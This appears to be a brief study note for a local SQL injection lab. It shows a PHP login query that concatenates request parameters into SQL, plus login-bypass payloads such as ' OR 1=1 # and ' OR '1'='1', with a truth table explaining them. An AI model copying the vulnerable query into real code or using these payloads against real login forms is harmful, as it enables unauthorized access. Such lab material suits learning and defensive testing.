first add the project to " C:\xampp\htdocs "


$sql = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "' AND password = '" . $_GET['password'] . "'";



injection with this username =  ' OR 1=1 #   ' OR 1 #    type anything here' OR 1 #


1 true 
0 false 

1 or 1 = 1
1 or 0 = 1
0 or 1 = 1
0 or 0 = 0


injection with this username = ' OR '1'='1'  ' OR 1=1 #    ' OR 1=1 /* 

'' OR '1'='1' == 1

$sql = "SELECT * FROM users WHERE username = ''' AND password = '2004'";
